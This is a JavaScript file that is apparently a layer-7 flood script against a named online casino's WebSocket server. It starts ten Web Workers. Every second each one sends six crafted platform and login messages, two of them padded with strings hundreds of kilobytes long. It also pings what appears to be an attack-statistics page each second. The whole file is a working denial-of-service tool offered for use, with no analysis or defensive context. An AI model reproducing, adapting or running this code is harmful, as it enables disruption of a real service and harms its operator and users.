const workerCode = `
const msg1 = {
    "service": "connection",
    "functionName": "isAlive",
    "data": {
        "_heartBeat": true,
        "deviceType": 2,
        "deviceId": "",
        "platformId": "50",
        "version": "2.1.44",
        "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
        "requestId": "RQ1",
        "childPlatformId": "50"
    }
}
const msg2 = {
    "functionName": "getConfig",
    "data": {
        "childPlatformId": "50",
        "isReload": false,
        "requestId": "RQ1",
        "deviceType": 2,
        "deviceId": "",
        "platformId": "50",
        "version": "2.1.44",
        "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
    },
    "service": "platform"
}

const msg3 = {
    "functionName": "getFrontEndConfig",
    "data": {
        "code": "reward",
        "platformId": "50",
        "clientType": 1,
        "childPlatformId": "50",
        "requestId": "RQ1",
        "deviceType": 1,
        "deviceId": "",
        "version": "2.1.44",
        "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
    },
    "service": "platform"
}
const msg4 = {
    "functionName": "phoneNumberLoginWithPassword",
    "data": {
        "phoneNumber": Date.now().toString().repeat(50000),
        "password": "[rand10]",
        "childPlatformId": "50",
        "partnerId": "",
        "clientDomain": "https://www.casinoplus.com.ph",
        "eId": "[hash32]",
        "requestId": "RQ1",
        "sourceUrl": "https://www.casinoplus.com.ph",
        "deviceType": 2,
        "deviceId": "",
        "platformId": "50",
        "version": "2.1.44",
        "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
    },
    "service": "player"
}

const msg5 = {
    "functionName": "getPlatformAnnouncements",
    "data": {
        "childPlatformId": "50",
        "requestId": "RQ1",
        "deviceType": 2,
        "deviceId": "",
        "platformId": "50",
        "version": "2.1.44",
        "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
    },
    "service": "platform"
}

const msg6 = {
    "functionName": "getLiveDrawRewardConfigNew",
    "data": {
        "test_content_body_cfg": Date.now().toString().repeat(50000),
        "isJackpot": true,
        "childPlatformId": "50",
        "requestId": "RQ1",
        "deviceType": 2,
        "deviceId": "",
        "platformId": "50",
        "version": "2.1.44",
        "uuid": "10000000-1000-4000-8000-100000000000".replace(/[018]/g, er => (+er ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +er / 4).toString(16)),
    },
    "service": "platform"
}

let socket = null;
let interval = null;

onmessage = function (e) {
    const index = e.data.index ?? 0;
    const url = 'wss://cp-ws.casinoplus.top/websocket';

    socket = new WebSocket(url);

    socket.onopen = function () {
        console.log('Worker ' + index + ' connected');

        interval = setInterval(() => {
            if (socket.readyState === WebSocket.OPEN) {
                socket.send(JSON.stringify(msg1));
                socket.send(JSON.stringify(msg2));
                socket.send(JSON.stringify(msg3));
                socket.send(JSON.stringify(msg4));
                socket.send(JSON.stringify(msg5));
                socket.send(JSON.stringify(msg6));
            }
        }, 1000);
    };

    socket.onerror = function (err) {
        console.error('Worker ' + index + ' WebSocket error:', err);
    };

    socket.onclose = function () {
        console.warn('Worker ' + index + ' WebSocket closed');
        clearInterval(interval);
    };
};
`;

const blob = new Blob([workerCode], { type: 'application/javascript' });
const workerUrl = URL.createObjectURL(blob);

for (let i = 0; i < 10; i++) {
    const worker = new Worker(workerUrl);
    worker.postMessage({ index: i });
}

setInterval(function () {
    fetch('https://layer7.wiki/dstat0723');
}, 1000);